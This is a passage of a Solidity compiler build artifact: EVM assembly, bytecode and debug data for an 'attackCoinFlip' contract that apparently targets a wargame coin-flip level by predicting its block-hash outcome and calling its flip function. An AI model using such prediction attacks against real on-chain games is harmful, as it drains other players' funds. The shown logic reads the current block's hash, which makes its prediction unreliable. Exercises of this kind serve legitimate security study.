sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xff\n      and\n      dup2\n      jump\t// out\n        /* \"CoinFlip/attackCoinFlip.sol\":214:533  function guessTheCurrentBlockValue() public returns(uint256){... */\n    tag_16:\n        /* \"CoinFlip/attackCoinFlip.sol\":266:273  uint256 */\n      0x00\n        /* \"CoinFlip/attackCoinFlip.sol\":285:305  uint256 tmpOfCurrent */\n      dup1\n        /* \"CoinFlip/attackCoinFlip.sol\":326:338  block.number */\n      number\n        /* \"CoinFlip/attackCoinFlip.sol\":316:339  blockhash(block.number) */\n      blockhash\n        /* \"CoinFlip/attackCoinFlip.sol\":308:340  uint256(blockhash(block.number)) */\n      0x00\n      shr\n        /* \"CoinFlip/attackCoinFlip.sol\":285:340  uint256 tmpOfCurrent = uint256(blockhash(block.number)) */\n      swap1\n      pop\n        /* \"CoinFlip/attackCoinFlip.sol\":367:462  tmpOfCurrent.div(57896044618658097711785492504343953926634992332820282019728792003956564819968) */\n      tag_23\n        /* \"CoinFlip/attackCoinFlip.sol\":384:461  57896044618658097711785492504343953926634992332820282019728792003956564819968 */\n      0x8000000000000000000000000000000000000000000000000000000000000000\n        /* \"CoinFlip/attackCoinFlip.sol\":367:379  tmpOfCurrent */\n      dup3\n        /* \"CoinFlip/attackCoinFlip.sol\":367:383  tmpOfCurrent.div */\n      tag_24\n      swap1\n        /* \"CoinFlip/attackCoinFlip.sol\":367:462  tmpOfCurrent.div(57896044618658097711785492504343953926634992332820282019728792003956564819968) */\n      swap2\n      swap1\n      0xffffffff\n      and\n      jump\t// in\n    tag_23:\n        /* \"CoinFlip/attackCoinFlip.sol\":351:364  guessingValue */\n      0x00\n        /* \"CoinFlip/attackCoinFlip.sol\":351:462  guessingValue = tmpOfCurrent.div(57896044618658097711785492504343953926634992332820282019728792003956564819968) */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"CoinFlip/attackCoinFlip.sol\":505:506  1 */\n      0x01\n        /* \"CoinFlip/attackCoinFlip.sol\":488:501  guessingValue */\n      sload(0x00)\n        /* \"CoinFlip/attackCoinFlip.sol\":488:506  guessingValue == 1 */\n      eq\n        /* \"CoinFlip/attackCoinFlip.sol\":488:521  guessingValue == 1 ? true : false */\n      tag_25\n      jumpi\n        /* \"CoinFlip/attackCoinFlip.sol\":516:521  false */\n      0x00\n        /* \"CoinFlip/attackCoinFlip.sol\":488:521  guessingValue == 1 ? true : false */\n      jump(tag_26)\n    tag_25:\n        /* \"CoinFlip/attackCoinFlip.sol\":509:513  true */\n      0x01\n        /* \"CoinFlip/attackCoinFlip.sol\":488:521  guessingValue == 1 ? true : false */\n    tag_26:\n        /* \"CoinFlip/attackCoinFlip.sol\":477:485  guessing */\n      0x01\n      0x00\n        /* \"CoinFlip/attackCoinFlip.sol\":477:521  guessing = guessingValue == 1 ? true : false */\n      0x0100\n      exp\n      dup2\n      sload\n      dup2\n      0xff\n      mul\n      not\n      and\n      swap1\n      dup4\n      iszero\n      iszero\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"CoinFlip/attackCoinFlip.sol\":274:533  {... */\n      pop\n        /* \"CoinFlip/attackCoinFlip.sol\":214:533  function guessTheCurrentBlockValue() public returns(uint256){... */\n      swap1\n      jump\t// out\n        /* \"CoinFlip/attackCoinFlip.sol\":539:701  function attack(address _contract) public  {... */\n    tag_21:\n        /* \"CoinFlip/attackCoinFlip.sol\":593:604  bool result */\n      0x00\n        /* \"CoinFlip/attackCoinFlip.sol\":623:633  CoinFlip C */\n      dup1\n        /* \"CoinFlip/attackCoinFlip.sol\":645:654  _contract */\n      dup3\n        /* \"CoinFlip/attackCoinFlip.sol\":623:655  CoinFlip C = CoinFlip(_contract) */\n      swap1\n      pop\n        /* \"CoinFlip/attackCoinFlip.sol\":675:676  C */\n      dup1\n        /* \"CoinFlip/attackCoinFlip.sol\":675:681  C.flip */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x1d263f67\n        /* \"CoinFlip/attackCoinFlip.sol\":682:690  guessing */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xff\n      and\n        /* \"CoinFlip/attackCoinFlip.sol\":675:691  C.flip(guessing) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_28\n      swap2\n      swap1\n      tag_14\n      jump\t// in\n    tag_28:\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_30\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_30:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_31\n      swap2\n      swap1\n      tag_32\n      jump\t// in\n    tag_31:\n        /* \"CoinFlip/attackCoinFlip.sol\":666:691  result = C.flip(guessing) */\n      swap2\n      pop\n        /* \"CoinFlip/attackCoinFlip.sol\":582:701  {... */\n      pop\n      pop\n        /* \"CoinFlip/attackCoinFlip.sol\":539:701  function attack(address _contract) public  {... */\n      pop\n      jump\t// out\n        /* \"Fallback/SafeMath.sol\":3969:4067  function div(uint256 a, uint256 b) internal pure returns (uint256) {... */\n    tag_24:\n        /* \"Fallback/SafeMath.sol\":4027:4034  uint256 */\n      0x00\n        /* \"Fallback/SafeMath.sol\":4058:4059  b */\n      dup2\n        /* \"Fallback/SafeMath.sol\":4054:4055  a */\n      dup4\n        /* \"Fallback/SafeMath.sol\":4054:4059  a / b */\n      tag_34\n      swap2\n      swap1\n      tag_35\n      jump\t// in\n    tag_34:\n        /* \"Fallback/SafeMath.sol\":4047:4059  return a / b */\n      swap1\n      pop\n        /* \"Fallback/SafeMath.sol\":3969:4067  function div(uint256 a, uint256 b) internal pure returns (uint256) {... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":7:84   */\n    tag_36:\n        /* \"#utility.yul\":44:51   */\n      0x00\n        /* \"#utility.yul\":73:78   */\n      dup2\n        /* \"#utility.yul\":62:78   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:84   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":90:208   */\n    tag_37:\n        /* \"#utility.yul\":177:201   */\n      tag_54\n        /* \"#utility.yul\":195:200   */\n      dup2\n        /* \"#utility.yul\":177:201   */\n      tag_36\n      jump\t// in\n    tag_54:\n        /* \"#utility.yul\":172:175   */\n      dup3\n        /* \"#utility.yul\":165:202   */\n      mstore\n        /* \"#utility.yul\":90:208   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":214:436   */\n    tag_10:\n        /* \"#utility.yul\":307:311   */\n      0x00\n        /* \"#utility.yul\":345:347   */\n      0x20\n        /* \"#utility.yul\":334:343   */\n      dup3\n        /* \"#utility.yul\":330:348   */\n      add\n        /* \"#utility.yul\":322:348   */\n      swap1\n      pop\n        /* \"#utility.yul\":358:429   */\n      tag_56\n        /* \"#utility.yul\":426:427   */\n      0x00\n        /* \"#utility.yul\":415:424   */\n      dup4\n        /* \"#utility.yul\":411:428   */\n      add\n        /* \"#utility.yul\":402:408   */\n      dup5\n        /* \"#utility.yul\":358:429   */\n      tag_37\n      jump\t// in\n    tag_56:\n        /* \"#utility.yul\":214:436   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":442:532   */\n    tag_38:\n        /* \"#utility.yul\":476:483   */\n      0x00\n        /* \"#utility.yul\":519:524   */\n      dup2\n        /* \"#utility.yul\":512:525   */\n      iszero\n        /* \"#utility.yul\":505:526   */\n      iszero\n        /* \"#utility.yul\":494:526   */\n      swap1\n      pop\n        /* \"#utility.yul\":442:532   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":538:647   */\n    tag_39:\n        /* \"#utility.yul\":619:640   */\n      tag_59\n        /* \"#utility.yul\":634:639   */\n      dup2\n        /* \"#utility.yul\":619:640   */\n      tag_38\n      jump\t// in\n    tag_59:\n        /* \"#utility.yul\":614:617   */\n      dup3\n        /* \"#utility.yul\":607:641   */\n      mstore\n        /* \"#utility.yul\":538:647   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":653:863   */\n    tag_14:\n        /* \"#utility.yul\":740:744   */\n      0x00\n        /* \"#utility.yul\":778:780   */\n      0x20\n        /* \"#utility.yul\":767:776   */\n      dup3\n        /* \"#utility.yul\":763:781   */\n      add\n        /* \"#utility.yul\":755:781   */\n      swap1\n      pop\n        /* \"#utility.yul\":791:856   */\n      tag_61\n        /* \"#utility.yul\":853:854   */\n      0x00\n        /* \"#utility.yul\":842:851   */\n      dup4\n        /* \"#utility.yul\":838:855   */\n      add\n        /* \"#utility.yul\":829:835   */\n      dup5\n        /* \"#utility.yul\":791:856   */\n      tag_39\n      jump\t// in\n    tag_61:\n        /* \"#utility.yul\":653:863   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":950:1067   */\n    tag_41:\n        /* \"#utility.yul\":1059:1060   */\n      0x00\n        /* \"#utility.yul\":1056:1057   */\n      dup1\n        /* \"#utility.yul\":1049:1061   */\n      revert\n        /* \"#utility.yul\":1196:1322   */\n    tag_43:\n        /* \"#utility.yul\":1233:1240   */\n      0x00\n        /* \"#utility.yul\":1273:1315   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":1266:1271   */\n      dup3\n        /* \"#utility.yul\":1262:1316   */\n      and\n        /* \"#utility.yul\":1251:1316   */\n      swap1\n      pop\n        /* \"#utility.yul\":1196:1322   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1328:1424   */\n    tag_44:\n        /* \"#utility.yul\":1365:1372   */\n      0x00\n        /* \"#utility.yul\":1394:1418   */\n      tag_67\n        /* \"#utility.yul\":1412:1417   */\n      dup3\n        /* \"#utility.yul\":1394:1418   */\n      tag_43\n      jump\t// in\n    tag_67:\n        /* \"#utility.yul\":1383:1418   */\n      swap1\n      pop\n        /* \"#utility.yul\":1328:1424   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1430:1552   */\n    tag_45:\n        /* \"#utility.yul\":1503:1527   */\n      tag_69\n        /* \"#utility.yul\":1521:1526   */\n      dup2\n        /* \"#utility.yul\":1503:1527   */\n      tag_44\n      jump\t// in\n    tag_69:\n        /* \"#utility.yul\":1496:1501   */\n      dup2\n        /* \"#utility.yul\":1493:1528   */\n      eq\n        /* \"#utility.yul\":1483:1546   */\n      tag_70\n      jumpi\n        /* \"#utility.yul\":1542:1543   */\n      0x00\n        /* \"#utility.yul\":1539:1540   */\n      dup1\n        /* \"#utility.yul\":1532:1544   */\n      revert\n        /* \"#utility.yul\":1483:1546   */\n    tag_70:\n        /* \"#utility.yul\":1430:1552   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1558:1697   */\n    tag_46:\n        /* \"#utility.yul\":1604:1609   */\n      0x00\n        /* \"#utility.yul\":1642:1648   */\n      dup2\n        /* \"#utility.yul\":1629:1649   */\n      calldataload\n        /* \"#utility.yul\":1620:1649   */\n      swap1\n      pop\n        /* \"#utility.yul\":1658:1691   */\n      tag_72\n        /* \"#utility.yul\":1685:1690   */\n      dup2\n        /* \"#utility.yul\":1658:1691   */\n      tag_45\n      jump\t// in\n    tag_72:\n        /* \"#utility.yul\":1558:1697   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1703:2032   */\n    tag_20:\n        /* \"#utility.yul\":1762:1768   */\n      0x00\n        /* \"#utility.yul\":1811:1813   */\n      0x20\n        /* \"#utility.yul\":1799:1808   */\n      dup3\n        /* \"#utility.yul\":1790:1797   */\n      dup5\n        /* \"#utility.yul\":1786:1809   */\n      sub\n        /* \"#utility.yul\":1782:1814   */\n      slt\n        /* \"#utility.yul\":1779:1898   */\n      iszero\n      tag_74\n      jumpi\n        /* \"#utility.yul\":1817:1896   */\n      tag_75\n      tag_41\n      jump\t// in\n    tag_75:\n        /* \"#utility.yul\":1779:1898   */\n    tag_74:\n        /* \"#utility.yul\":1937:1938   */\n      0x00\n        /* \"#utility.yul\":1962:2015   */\n      tag_76\n        /* \"#utility.yul\":2007:2014   */\n      dup5\n        /* \"#utility.yul\":1998:2004   */\n      dup3\n        /* \"#utility.yul\":1987:1996   */\n      dup6\n        /* \"#utility.yul\":1983:2005   */\n      add\n        /* \"#utility.yul\":1962:2015   */\n      tag_46\n      jump\t// in\n    tag_76:\n        /* \"#utility.yul\":1952:2015   */\n      swap2\n      pop\n        /* \"#utility.yul\":1908:2025   */\n      pop\n        /* \"#utility.yul\":1703:2032   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2038:2154   */\n    tag_47:\n        /* \"#utility.yul\":2108:2129   */\n      tag_78\n        /* \"#utility.yul\":2123:2128   */\n      dup2\n        /* \"#utility.yul\":2108:2129   */\n      tag_38\n      jump\t// in\n    tag_78:\n        /* \"#utility.yul\":2101:2106   */\n      dup2\n        /* \"#utility.yul\":2098:2130   */\n      eq\n        /* \"#utility.yul\":2088:2148   */\n      tag_79\n      jumpi\n        /* \"#utility.yul\":2144:2145   */\n      0x00\n        /* \"#utility.yul\":2141:2142   */\n      dup1\n        /* \"#utility.yul\":2134:2146   */\n      revert\n        /* \"#utility.yul\":2088:2148   */\n    tag_79:\n        /* \"#utility.yul\":2038:2154   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2160:2297   */\n    tag_48:\n        /* \"#utility.yul\":2214:2219   */\n      0x00\n        /* \"#utility.yul\":2245:2251   */\n      dup2\n        /* \"#utility.yul\":2239:2252   */\n      mload\n        /* \"#utility.yul\":2230:2252   */\n      swap1\n      pop\n        /* \"#utility.yul\":2261:2291   */\n      tag_81\n        /* \"#utility.yul\":2285:2290   */\n      dup2\n        /* \"#utility.yul\":2261:2291   */\n      tag_47\n      jump\t// in\n    tag_81:\n        /* \"#utility.yul\":2160:2297   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2303:2648   */\n    tag_32:\n        /* \"#utility.yul\":2370:2376   */\n      0x00\n        /* \"#utility.yul\":2419:2421   */\n      0x20\n        /* \"#utility.yul\":2407:2416   */\n      dup3\n        /* \"#utility.yul\":2398:2405   */\n      dup5\n        /* \"#utility.yul\":2394:2417   */\n      sub\n        /* \"#utility.yul\":2390:2422   */\n      slt\n        /* \"#utility.yul\":2387:2506   */\n      iszero\n      tag_83\n      jumpi\n        /* \"#utility.yul\":2425:2504   */\n      tag_84\n      tag_41\n      jump\t// in\n    tag_84:\n        /* \"#utility.yul\":2387:2506   */\n    tag_83:\n        /* \"#utility.yul\":2545:2546   */\n      0x00\n        /* \"#utility.yul\":2570:2631   */\n      tag_85\n        /* \"#utility.yul\":2623:2630   */\n      dup5\n        /* \"#utility.yul\":2614:2620   */\n      dup3\n        /* \"#utility.yul\":2603:2612   */\n      dup6\n        /* \"#utility.yul\":2599:2621   */\n      add\n        /* \"#utility.yul\":2570:2631   */\n      tag_48\n      jump\t// in\n    tag_85:\n        /* \"#utility.yul\":2560:2631   */\n      swap2\n      pop\n        /* \"#utility.yul\":2516:2641   */\n      pop\n        /* \"#utility.yul\":2303:2648   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2654:2834   */\n    tag_49:\n        /* \"#utility.yul\":2702:2779   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":2699:2700   */\n      0x00\n        /* \"#utility.yul\":2692:2780   */\n      mstore\n        /* \"#utility.yul\":2799:2803   */\n      0x12\n        /* \"#utility.yul\":2796:2797   */\n      0x04\n        /* \"#utility.yul\":2789:2804   */\n      mstore\n        /* \"#utility.yul\":2823:2827   */\n      0x24\n        /* \"#utility.yul\":2820:2821   */\n      0x00\n        /* \"#utility.yul\":2813:2828   */\n      revert\n        /* \"#utility.yul\":3026:3211   */\n    tag_35:\n        /* \"#utility.yul\":3066:3067   */\n      0x00\n        /* \"#utility.yul\":3083:3103   */\n      tag_89\n        /* \"#utility.yul\":3101:3102   */\n      dup3\n        /* \"#utility.yul\":3083:3103   */\n      tag_36\n      jump\t// in\n    tag_89:\n        /* \"#utility.yul\":3078:3103   */\n      swap2\n      pop\n        /* \"#utility.yul\":3117:3137   */\n      tag_90\n        /* \"#utility.yul\":3135:3136   */\n      dup4\n        /* \"#utility.yul\":3117:3137   */\n      tag_36\n      jump\t// in\n    tag_90:\n        /* \"#utility.yul\":3112:3137   */\n      swap3\n      pop\n        /* \"#utility.yul\":3156:3157   */\n      dup3\n        /* \"#utility.yul\":3146:3181   */\n      tag_91\n      jumpi\n        /* \"#utility.yul\":3161:3179   */\n      tag_92\n      tag_49\n      jump\t// in\n    tag_92:\n        /* \"#utility.yul\":3146:3181   */\n    tag_91:\n        /* \"#utility.yul\":3203:3204   */\n      dup3\n        /* \"#utility.yul\":3200:3201   */\n      dup3\n        /* \"#utility.yul\":3196:3205   */\n      div\n        /* \"#utility.yul\":3191:3205   */\n      swap1\n      pop\n        /* \"#utility.yul\":3026:3211   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa264697066735822122045ecbf8eed1253051153e3bb775e09230f0a51235f93cd23f81fde802cbc159f64736f6c634300080d0033\n}\n",
						"bytecode": {
							"functionDebugData": {},
							"generatedSources": [],
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b506103eb806100206000396000f3fe608060405234801561001057600080fd5b506004361061004c5760003560e01c80633fe6dd291461005157806379e41b391461006f57806399b084bf1461008d578063d018db3e146100ab575b600080fd5b6100596100c7565b604051610066919061021b565b60405180910390f35b6100776100cd565b6040516100849190610251565b60405180910390f35b6100956100e0565b6040516100a2919061021b565b60405180910390f35b6100c560048036038101906100c091906102cf565b610154565b005b60005481565b600160009054906101000a900460ff1681565b600080434060001c905061011d7f8000000000000000000000000000000000000000000000000000000000000000826101ec90919063ffffffff16565b600081905550600160005414610134576000610137565b60015b600160006101000a81548160ff0219169083151502179055505090565b6000808290508073ffffffffffffffffffffffffffffffffffffffff16631d263f67600160009054906101000a900460ff166040518263ffffffff1660e01b81526004016101a29190610251565b6020604051808303816000875af11580156101c1573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101e59190610328565b9150505050565b600081836101fa9190610384565b905092915050565b6000819050919050565b61021581610202565b82525050565b6000602082019050610230600083018461020c565b92915050565b60008115159050919050565b61024b81610236565b82525050565b60006020820190506102666000830184610242565b92915050565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061029c82610271565b9050919050565b6102ac81610291565b81146102b757600080fd5b50565b6000813590506102c9816102a3565b92915050565b6000602082840312156102e5576102e461026c565b5b60006102f3848285016102ba565b91505092915050565b61030581610236565b811461031057600080fd5b50565b600081519050610322816102fc565b92915050565b60006020828403121561033e5761033d61026c565b5b600061034c84828501610313565b91505092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b600061038f82610202565b915061039a83610202565b9250826103aa576103a9610355565b5b82820490509291505056fea264697066735822122045ecbf8eed1253051153e3bb775e09230f0a51235f93cd23f81fde802cbc159f64736f6c634300080d0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x3EB DUP1 PUSH2 0x20 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x4C JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x3FE6DD29 EQ PUSH2 0x51 JUMPI DUP1 PUSH4 0x79E41B39 EQ PUSH2 0x6F JUMPI DUP1 PUSH4 0x99B084BF EQ PUSH2 0x8D JUMPI DUP1 PUSH4 0xD018DB3E EQ PUSH2 0xAB JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x59 PUSH2 0xC7 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x66 SWAP2 SWAP1 PUSH2 0x21B JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x77 PUSH2 0xCD JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x84 SWAP2 SWAP1 PUSH2 0x251 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x95 PUSH2 0xE0 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xA2 SWAP2 SWAP1 PUSH2 0x21B JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0xC5 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0xC0 SWAP2 SWAP1 PUSH2 0x2CF JUMP JUMPDEST PUSH2 0x154 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 DUP1 NUMBER BLOCKHASH PUSH1 0x0 SHR SWAP1 POP PUSH2 0x11D PUSH32 0x8000000000000000000000000000000000000000000000000000000000000000 DUP3 PUSH2 0x1EC SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 SSTORE POP PUSH1 0x1 PUSH1 0x0 SLOAD EQ PUSH2 0x134 JUMPI PUSH1 0x0 PUSH2 0x137 JUMP JUMPDEST PUSH1 0x1 JUMPDEST PUSH1 0x1 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP1 DUP3 SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x1D263F67 PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x1A2 SWAP2 SWAP1 PUSH2 0x251 JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x1C1 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x1E5 SWAP2 SWAP1 PUSH2 0x328 JUMP JUMPDEST SWAP2 POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 DUP4 PUSH2 0x1FA SWAP2 SWAP1 PUSH2 0x384 JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x215 DUP2 PUSH2 0x202 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x230 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x20C JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x24B DUP2 PUSH2 0x236 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x266 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x242 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x29C DUP3 PUSH2 0x271 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x2AC DUP2 PUSH2 0x291 JUMP JUMPDEST DUP2 EQ PUSH2 0x2B7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x2C9 DUP2 PUSH2 0x2A3 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x2E5 JUMPI PUSH2 0x2E4 PUSH2 0x26C JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x2F3 DUP5 DUP3 DUP6 ADD PUSH2 0x2BA JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x305 DUP2 PUSH2 0x236 JUMP JUMPDEST DUP2 EQ PUSH2 0x310 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x322 DUP2 PUSH2 0x2FC JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x33E JUMPI PUSH2 0x33D PUSH2 0x26C JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x34C DUP5 DUP3 DUP6 ADD PUSH2 0x313 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x38F DUP3 PUSH2 0x202 JUMP JUMPDEST SWAP2 POP PUSH2 0x39A DUP4 PUSH2 0x202 JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0x3AA JUMPI PUSH2 0x3A9 PUSH2 0x355 JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 GASLIMIT 0xEC 0xBF DUP15 0xED SLT MSTORE8 SDIV GT MSTORE8 0xE3 0xBB PUSH24 0x5E09230F0A51235F93CD23F81FDE802CBC159F64736F6C63 NUMBER STOP ADDMOD 0xD STOP CALLER ",
							"sourceMap": "89:615:1:-:0;;;;;;;;;;;;;;;;;;;"
						},
						"deployedBytecode": {
							"functionDebugData": {
								"@attack_154": {
									"entryPoint": 340,
									"id": 154,
									"parameterSlots": 1,
									"returnSlots": 0
								},
								"@div_376": {
									"entryPoint": 492,
									"id": 376,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"@guessTheCurrentBlockValue_130": {
									"entryPoint": 224,
									"id": 130,
									"parameterSlots": 0,
									"returnSlots": 1
								},
								"@guessingValue_96": {
									"entryPoint": 199,
									"id": 96,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"@guessing_98": {
									"entryPoint": 205,
									"id": 98,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"abi_decode_t_address": {
									"entryPoint": 698,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_decode_t_bool_fromMemory": {
									"entryPoint": 787,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_decode_tuple_t_address": {
									"entryPoint": 719,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_decode_tuple_t_bool_fromMemory": {
									"entryPoint": 808,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_encode_t_bool_to_t_bool_fromStack": {
									"entryPoint": 578,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 0
								},
								"abi_encode_t_uint256_to_t_uint256_fromStack": {
									"entryPoint": 524,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 0
								},
								"abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed": {
									"entryPoint": 593,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed": {
									"entryPoint": 539,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
